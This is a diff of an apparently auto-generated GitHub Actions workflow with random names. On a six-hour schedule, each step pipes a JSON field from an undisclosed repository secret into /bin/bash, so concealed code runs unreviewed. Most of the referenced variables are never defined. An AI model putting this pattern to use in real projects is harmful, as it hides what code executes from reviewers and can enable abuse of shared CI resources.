@@ -3,21 +3,25 @@ name: weichanghui7164
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 0/6 * * *'
-jobs:  # 9997
+    - cron: '39 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: weichanghui7164
         env:
-          gsqd139: ${{ secrets.gsqd139 }}
+          u79: ${{ secrets.u79 }}
         run: |
-          echo $gsqd139 | jq -r .fa1832 | /bin/bash
-          echo $kfqm426 | jq -r .rj2 | /bin/bash
-          echo $boelf19845 | jq -r .uzd878 | /bin/bash
-          echo $qy006 | jq -r .hhkj422 | /bin/bash
-          echo $vhqub3943 | jq -r .f78299 | /bin/bash
-          echo $fcs966 | jq -r .yye24 | /bin/bash
-          echo $xko1089 | jq -r .qf89 | /bin/bash
+          echo $u79 | jq -r .dd281 | /bin/bash
+          echo $yehp49291 | jq -r .qggx9016 | /bin/bash
+          echo $ehi2 | jq -r .wgh7 | /bin/bash
+          echo $kwenn18 | jq -r .kw588 | /bin/bash
+          echo $aw9831 | jq -r .orea592 | /bin/bash
+          echo $jxm901 | jq -r .cqyy43145 | /bin/bash
+          echo $mjv5255 | jq -r .hbxon33842 | /bin/bash
+          echo $grhy32 | jq -r .r39976 | /bin/bash
+          echo $f3 | jq -r .qzsvr4798 | /bin/bash
+          echo $nf022 | jq -r .exox5 | /bin/bash
 
